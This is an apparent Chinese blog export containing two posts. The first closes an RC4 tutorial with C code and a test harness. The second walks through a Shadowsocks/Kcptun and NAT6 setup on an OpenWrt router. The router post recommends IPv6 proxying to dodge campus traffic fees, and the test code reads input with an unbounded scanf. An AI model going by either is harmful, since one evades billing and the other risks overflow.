<h2 id="2-加密"><a href="#2-加密" class="headerlink" title="2) 加密"></a>2) 加密</h2><p>Pseudo-random generation algorithm (PRGA) 算法根据 S 盒生成与明文长度相同的秘钥流，使用秘钥流加密明文。秘钥流的生成如下图所示：<br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/RC4.svg/800px-RC4.svg.png" alt=""><br>循环体中每收到一个字节，a 和 b 定位S盒中的一个元素，并与输入字节异或，得到密文 k；同时，c 还改变了 S 盒。由于异或运算的特性，使得加密与解密过程一致。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">i := <span class="number">0</span></div><div class="line">j := <span class="number">0</span></div><div class="line"><span class="keyword">while</span> GeneratingOutput:</div><div class="line">    i := (i + <span class="number">1</span>) mod <span class="number">256</span>  <span class="comment">// a</span></div><div class="line">    j := (j + S[i]) mod <span class="number">256</span> <span class="comment">// b</span></div><div class="line">    swap values of S[i] <span class="keyword">and</span> S[j]  <span class="comment">// c</span></div><div class="line">    K := inputByte ^ S[(S[i] + S[j]) mod <span class="number">256</span>] <span class="comment">// d</span></div><div class="line">    output K</div><div class="line">endwhile</div></pre></td></tr></table></figure></p>
<h1 id="0x02-算法实现"><a href="#0x02-算法实现" class="headerlink" title="0x02 算法实现"></a>0x02 算法实现</h1><p><a href="https://opensource.apple.com/source/xnu/xnu-1456.1.26/bsd/crypto/rc4/rc4.c" target="_blank" rel="external">开源项目</a>中的算法实现（稍作修改）如下。</p>
<h2 id="1）开源实现"><a href="#1）开源实现" class="headerlink" title="1）开源实现"></a>1）开源实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// RC4.h</span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _SYS_CRYPTO_RC4_RC4_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _SYS_CRYPTO_RC4_RC4_H_</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rc4_state</span> &#123;</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  perm[<span class="number">256</span>];</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  index1;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  index2;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">int</span> keylen)</span></span>;</div><div class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *inbuf, <span class="keyword">unsigned</span> <span class="keyword">char</span> *outbuf, <span class="keyword">int</span> buflen)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_bytes</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *a, <span class="keyword">unsigned</span> <span class="keyword">char</span> *b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</div><div class="line">    temp = *a;</div><div class="line">    *a = *b;</div><div class="line">    *b = temp;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">* Initialize an RC4 state buffer using the supplied key,</div><div class="line">* which can have arbitrary length.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">int</span> keylen)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> j;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line"></div><div class="line">    <span class="comment">/* Initialize state with identity permutation */</span></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</div><div class="line">        state-&gt;perm[i] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)i;</div><div class="line">    state-&gt;index1 = <span class="number">0</span>;</div><div class="line">    state-&gt;index2 = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* Randomize the permutation using key data */</span></div><div class="line">    <span class="keyword">for</span> (j = i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</div><div class="line">        j = (j + state-&gt;perm[i] + key[i % keylen]) % <span class="number">256</span>;</div><div class="line">        swap_bytes(&amp;state-&gt;perm[i], &amp;state-&gt;perm[j]);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">* Encrypt some data using the supplied RC4 state buffer.</div><div class="line">* The input and output buffers may be the same buffer.</div><div class="line">* Since RC4 is a stream cypher, this function is used</div><div class="line">* for both encryption and decryption.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state,</span></span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *inbuf, <span class="keyword">unsigned</span> <span class="keyword">char</span> *outbuf, <span class="keyword">int</span> buflen)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; buflen; i++) &#123;</div><div class="line"></div><div class="line">        <span class="comment">/* Update modification indicies */</span></div><div class="line">        state-&gt;index1 = (state-&gt;index1 + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">        state-&gt;index2 = (state-&gt;index2 + state-&gt;perm[state-&gt;index1]) % <span class="number">256</span>;</div><div class="line"></div><div class="line">        <span class="comment">/* Modify permutation */</span></div><div class="line">        swap_bytes(&amp;state-&gt;perm[state-&gt;index1], &amp;state-&gt;perm[state-&gt;index2]);</div><div class="line"></div><div class="line">        <span class="comment">/* Encrypt/decrypt next byte */</span></div><div class="line">        j = (state-&gt;perm[state-&gt;index1] + state-&gt;perm[state-&gt;index2]) % <span class="number">256</span>;</div><div class="line">        outbuf[i] = inbuf[i] ^ state-&gt;perm[j];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
<h2 id="2）测试"><a href="#2）测试" class="headerlink" title="2）测试"></a>2）测试</h2><p>使用以下代码进行测试加密和解密的结果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"RC4.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 50</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> plaintext[LEN] = &#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> crypt[LEN]&#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> decrypt[LEN]&#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[LEN] = <span class="string">"1234567890"</span>;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rc4_state</span> <span class="title">state</span>;</span></div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, plaintext);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"plaintext:\n"</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>, plaintext[i]);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        rc4_init(&amp;state, key, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)key));<span class="comment">// this code is very important</span></div><div class="line">        rc4_crypt(&amp;state, plaintext, crypt, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n\ncrypt:\n"</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c,"</span>, crypt[i]);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n\ndecrypt: \n"</span>);</div><div class="line">        rc4_init(&amp;state, key, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)key));<span class="comment">// this code is very important</span></div><div class="line">        rc4_crypt(&amp;state, crypt, decrypt, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>, decrypt[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n-------------------------------------------------\n\n"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行结果如下：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-9-19/88889666.jpg" alt=""></p>
<hr>
<p>References:<br>[1] <a href="https://en.wikipedia.org/wiki/RC4" target="_blank" rel="external">RC4</a><br>[2] <a href="http://gttiankai.github.io/2015/01/18/Rc4.html" target="_blank" rel="external">流加密RC4的C语言实现</a><br>[3] <a href="http://www.cnblogs.com/zibility/p/5404478.html" target="_blank" rel="external">RC4加密算法</a></p>
]]></content>
      
        <categories>
            
            <category> Crypto </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RC4 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在斐讯 K2 上部署 Shadowsocks 与 Kcptun]]></title>
      <url>/2017/0826/deploy-shadowsocks-and-kcptun-on-fibonacci-k2/</url>
      <content type="html"><![CDATA[<p>对于程序员来说，能顺畅使用互联网能够很大程度地提高工作效率。所以，通过 SS 来实现代理上网是一个很好的解决方案。此外，对于能使用校园网的学生党而言，还可以使用 SS + IPv6 来实现免流，这样就能把省下来的网费用来买VPS了。</p>
<p>然而，在 PC 上直接使用客户端软件代理上网有以下缺点：<br>1）不能实现全局流量的代理功能，只有支持代理功能的应用才能通过 SS 代理上网。虽然有相关的软件可以实现全局流量代理，但这样就很不方便，为了代理上网要多开好几个应用。<br>2）如果手机等其他设备也想使用代理，也必须得用客户端才能行。</p>
<p>为了能方便地在多个终端使用代理，可以在路由器上部署 SS 客户端，那么经过这台路由器的所有流量都能走代理，对于终端设备上的所有应用而言，代理是透明的。</p>
<h1 id="0x01-前提条件"><a href="#0x01-前提条件" class="headerlink" title="0x01 前提条件"></a>0x01 前提条件</h1><p>首先需要一台已部署好 Shadowsocks 和 Kcptun 的 VPS，服务器上安装 SS 和 Kcptun 相对要简单一些，可以在网络上能找到脚本实现一键安装。安装好之后在 PC 上安装相应的客户端软件，设置好参数并测试服务端能否正常使用。</p>
<p>下面是在斐讯 K2 上部署 SS 和 Kcptun 的过程。</p>
<h1 id="0x02-设置-NAT6"><a href="#0x02-设置-NAT6" class="headerlink" title="0x02 设置 NAT6"></a>0x02 设置 NAT6</h1><p>为了使内网端口能获取到 IPv6 地址，需要进行以下配置。</p>
<p>首先更改网络/接口设置。WAN 设置 PPPoE 拨号，WAN6 设置为 DHCPv6 客户端，强制请求 IPv6 地址并禁用请求指定长度的 IPv6 前缀。</p>
<h2 id="1-安装软件包"><a href="#1-安装软件包" class="headerlink" title="1. 安装软件包"></a>1. 安装软件包</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">opkg update &amp;&amp; opkg install kmod-ipt-nat6</div><div class="line">opkg install iputils-tracepath6</div></pre></td></tr></table></figure>
<h2 id="2-修改前缀"><a href="#2-修改前缀" class="headerlink" title="2. 修改前缀"></a>2. 修改前缀</h2><p>把 IPv6 ULA 前缀改成 d 开头。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">uci set network.globals.ula_prefix=<span class="string">"$(uci get network.globals.ula_prefix | sed 's/^./d/')"</span></div><div class="line">uci commit network</div></pre></td></tr></table></figure></p>
<h2 id="3-添加-nat6"><a href="#3-添加-nat6" class="headerlink" title="3. 添加 nat6"></a>3. 添加 nat6</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">touch /etc/init.d/nat6</div><div class="line">vi /etc/init.d/nat6</div><div class="line"></div><div class="line">#!/bin/sh /etc/rc.common</div><div class="line"># NAT6 init script for OpenWrt // Depends on package: kmod-ipt-nat6</div><div class="line"></div><div class="line">START=55</div><div class="line"></div><div class="line"># Options</div><div class="line"># -------</div><div class="line"></div><div class="line"># Use temporary addresses (IPv6 privacy extensions) for outgoing connections? Yes: 1 / No: 0</div><div class="line">PRIVACY=1</div><div class="line"></div><div class="line"># Maximum number of attempts before this script will stop in case no IPv6 route is available</div><div class="line"># This limits the execution time of the IPv6 route lookup to (MAX_TRIES+1)*(MAX_TRIES/2) seconds. The default (15) equals 120 seconds.</div><div class="line">MAX_TRIES=15</div><div class="line"></div><div class="line"># An initial delay (in seconds) helps to avoid looking for the IPv6 network too early. Ideally, the first probe is successful.</div><div class="line"># This would be the case if the time passed between the system log messages "Probing IPv6 route" and "Setting up NAT6" is 1 second.</div><div class="line">DELAY=5</div><div class="line"></div><div class="line"># Logical interface name of outbound IPv6 connection</div><div class="line"># There should be no need to modify this, unless you changed the default network interface names</div><div class="line"># Edit by Vincent: I never changed my default network interface names, but still I have to change the WAN6_NAME to "wan" instead of "wan6"</div><div class="line">WAN6_NAME="wan6"</div><div class="line"></div><div class="line"># ---------------------------------------------------</div><div class="line"># Options end here - no need to change anything below</div><div class="line"></div><div class="line">boot() &#123;</div><div class="line">        [ $DELAY -gt 0 ] &amp;&amp; sleep $DELAY</div><div class="line">        logger -t NAT6 "Probing IPv6 route"</div><div class="line">        PROBE=0</div><div class="line">        COUNT=1</div><div class="line">        while [ $PROBE -eq 0 ]</div><div class="line">        do</div><div class="line">                if [ $COUNT -gt $MAX_TRIES ]</div><div class="line">                then</div><div class="line">                        logger -t NAT6 "Fatal error: No IPv6 route found (reached retry limit)" &amp;&amp; exit 1</div><div class="line">                fi</div><div class="line">                sleep $COUNT</div><div class="line">                COUNT=$((COUNT+1))</div><div class="line">                PROBE=$(route -A inet6 | grep -c '::/0')</div><div class="line">        done</div><div class="line"></div><div class="line">        logger -t NAT6 "Setting up NAT6"</div><div class="line"></div><div class="line">        WAN6_INTERFACE=$(uci get "network.$WAN6_NAME.ifname")</div><div class="line">        if [ -z "$WAN6_INTERFACE" ] || [ ! -e "/sys/class/net/$WAN6_INTERFACE/" ] ; then</div><div class="line">                logger -t NAT6 "Fatal error: Lookup of $WAN6_NAME interface failed. Were the default interface names changed?" &amp;&amp; exit 1</div><div class="line">        fi</div><div class="line">        WAN6_GATEWAY=$(route -A inet6 -e | grep "$WAN6_INTERFACE" | awk '/::\/0/&#123;print $2; exit&#125;')</div><div class="line">        if [ -z "$WAN6_GATEWAY" ] ; then</div><div class="line">                logger -t NAT6 "Fatal error: No IPv6 gateway for $WAN6_INTERFACE found" &amp;&amp; exit 1</div><div class="line">        fi</div><div class="line">        LAN_ULA_PREFIX=$(uci get network.globals.ula_prefix)</div><div class="line">        if [ $(echo "$LAN_ULA_PREFIX" | grep -c -E "^([0-9a-fA-F]&#123;4&#125;):([0-9a-fA-F]&#123;0,4&#125;):") -ne 1 ] ; then</div><div class="line">                logger -t NAT6 "Fatal error: IPv6 ULA prefix $LAN_ULA_PREFIX seems invalid. Please verify that a prefix is set and valid." &amp;&amp; exit 1</div><div class="line">        fi</div><div class="line"></div><div class="line">        ip6tables -t nat -I POSTROUTING -s "$LAN_ULA_PREFIX" -o "$WAN6_INTERFACE" -j MASQUERADE</div><div class="line">        if [ $? -eq 0 ] ; then</div><div class="line">                logger -t NAT6 "Added IPv6 masquerading rule to the firewall (Src: $LAN_ULA_PREFIX - Dst: $WAN6_INTERFACE)"</div><div class="line">        else</div><div class="line">                logger -t NAT6 "Fatal error: Failed to add IPv6 masquerading rule to the firewall (Src: $LAN_ULA_PREFIX - Dst: $WAN6_INTERFACE)" &amp;&amp; exit 1</div><div class="line">        fi</div><div class="line"></div><div class="line">        route -A inet6 add 2000::/3 gw "$WAN6_GATEWAY" dev "$WAN6_INTERFACE"</div><div class="line">        if [ $? -eq 0 ] ; then</div><div class="line">                logger -t NAT6 "Added $WAN6_GATEWAY to routing table as gateway on $WAN6_INTERFACE for outgoing connections"</div><div class="line">        else</div><div class="line">                logger -t NAT6 "Error: Failed to add $WAN6_GATEWAY to routing table as gateway on $WAN6_INTERFACE for outgoing connections"</div><div class="line">        fi</div><div class="line"></div><div class="line">        if [ $PRIVACY -eq 1 ] ; then</div><div class="line">                echo 2 &gt; "/proc/sys/net/ipv6/conf/$WAN6_INTERFACE/accept_ra"</div><div class="line">                if [ $? -eq 0 ] ; then</div><div class="line">                        logger -t NAT6 "Accepting router advertisements on $WAN6_INTERFACE even if forwarding is enabled (required for temporary addresses)"</div><div class="line">                else</div><div class="line">                        logger -t NAT6 "Error: Failed to change router advertisements accept policy on $WAN6_INTERFACE (required for temporary addresses)"</div><div class="line">                fi</div><div class="line">                echo 2 &gt; "/proc/sys/net/ipv6/conf/$WAN6_INTERFACE/use_tempaddr"</div><div class="line">                if [ $? -eq 0 ] ; then</div><div class="line">                        logger -t NAT6 "Using temporary addresses for outgoing connections on interface $WAN6_INTERFACE"</div><div class="line">                else</div><div class="line">                        logger -t NAT6 "Error: Failed to enable temporary addresses for outgoing connections on interface $WAN6_INTERFACE"</div><div class="line">                fi</div><div class="line">        fi</div><div class="line"></div><div class="line">        exit 0</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="4-修改-sysctl-conf"><a href="#4-修改-sysctl-conf" class="headerlink" title="4. 修改 sysctl.conf"></a>4. 修改 sysctl.conf</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vim /etc/sysctl.conf</div><div class="line">net.ipv6.conf.default.forwarding=<span class="number">2</span></div><div class="line">net.ipv6.conf.all.forwarding=<span class="number">2</span></div><div class="line">net.ipv6.conf.default.accept_ra=<span class="number">2</span></div><div class="line">net.ipv6.conf.all.accept_ra=<span class="number">2</span></div></pre></td></tr></table></figure>
<h2 id="5-修改-DHCP"><a href="#5-修改-DHCP" class="headerlink" title="5. 修改 DHCP"></a>5. 修改 DHCP</h2><p>更改 DHCP 服务器的设置。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">vim /etc/config/dhcp</div><div class="line">config dhcp lan</div><div class="line">        option interface <span class="string">'lan'</span>                   </div><div class="line">        option start <span class="string">'100'</span>                       </div><div class="line">        option limit <span class="string">'150'</span>     </div><div class="line">        option leasetime <span class="string">'12h'</span></div><div class="line">        option dhcpv6 <span class="string">'server'</span></div><div class="line">        option ra <span class="string">'server'</span>    </div><div class="line">        option ra_management <span class="string">'1'</span>      </div><div class="line">        option ra_default <span class="string">'1'</span></div></pre></td></tr></table></figure></p>
<h2 id="6-配置防火墙规则"><a href="#6-配置防火墙规则" class="headerlink" title="6. 配置防火墙规则"></a>6. 配置防火墙规则</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">uci set firewall.@rule[<span class="string">"$(uci show firewall | grep 'Allow-ICMPv6-Forward' | cut -d'[' -f2 | cut -d']' -f1)"</span>].enabled=<span class="string">'0'</span></div><div class="line">uci commit firewall</div><div class="line">vim /etc/firewall.user</div><div class="line">ip6tables -t nat -I POSTROUTING -s $(uci get network.globals.ula_prefix) -j MASQUERADE</div></pre></td></tr></table></figure>
<h2 id="7-重启"><a href="#7-重启" class="headerlink" title="7. 重启"></a>7. 重启</h2><p>重启路由器，查看连接在该路由器上的设备是否成功获得 IPv6 地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reboot</div></pre></td></tr></table></figure></p>
<h1 id="0x03-部署-SS"><a href="#0x03-部署-SS" class="headerlink" title="0x03 部署 SS"></a>0x03 部署 SS</h1><h2 id="1-安装软件包-1"><a href="#1-安装软件包-1" class="headerlink" title="1. 安装软件包"></a>1. 安装软件包</h2><p>透明代理使用 Shadowsocks-libev 和 ChinDNS（可不配置） 实现。使用 ssh 登陆路由器，安装相关软件包。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">opkg update</div><div class="line">opkg install shadowsocks-libev luci-app-shadowsocks ChinaDNS luci-app-chinadns --force-checksum</div></pre></td></tr></table></figure></p>
<h2 id="2-更新-chnroute-表"><a href="#2-更新-chnroute-表" class="headerlink" title="2. 更新 chnroute 表"></a>2. 更新 chnroute 表</h2><p>使用以下命令更新：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -O- <span class="string">'http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest'</span> | awk -F\| <span class="string">'/CN\|ipv4/ &#123; printf("%s/%d\n", $4, 32-log($5)/log(2)) &#125;'</span> &gt; /etc/chnroute.txt</div></pre></td></tr></table></figure></p>
<h2 id="3-配置SS"><a href="#3-配置SS" class="headerlink" title="3. 配置SS"></a>3. 配置SS</h2><p>首先根据 SS 服务器中已设参数配置好 SS 的全局设置，包括以下参数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器地址：<span class="number">2607</span>:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx  <span class="comment"># 校园网 IPV6 免流</span></div><div class="line">服务器端口: <span class="number">443</span></div><div class="line">密码：xxxxxx</div><div class="line">加密方式：aes<span class="number">-256</span>-cfb</div></pre></td></tr></table></figure></p>
<p>配置透明代理：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">端口：<span class="number">1081</span></div><div class="line">忽略列表：/etc/chnroute.txt（如果使用全局代理则留空）</div><div class="line">代理协议：TCP+UDP</div></pre></td></tr></table></figure></p>
<p>配置UDP转发（ss-tunnel）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UDP本地端口：<span class="number">1153</span></div><div class="line">UDP转发地址：<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>:<span class="number">53</span></div></pre></td></tr></table></figure></p>
<p>配置 ChinaDNS：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Enable Bidirectional Filter：启用</div><div class="line">Enable DNS compression pointer：启用</div><div class="line">本地端口：<span class="number">1053</span>  //不能与ss-tunnel冲突</div><div class="line">CHNRoute File：/etc/chnroute.txt</div><div class="line">Upstream Servers：<span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span>,<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1153</span> //第一个是阿里DNS，第二个为 ss-tunnel 转发后的 Google DNS</div></pre></td></tr></table></figure></p>
<p>配置DHCP/DNS：<br>依次点击 <code>网络 -&gt; DHCP/DNS -&gt; 服务器设置</code> 进行设置。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">一般配置</div><div class="line">DNS转发：<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="comment">#1053</span></div><div class="line"></div><div class="line">HOSTS和解析文件</div><div class="line">忽略解析文件：启用</div></pre></td></tr></table></figure></p>
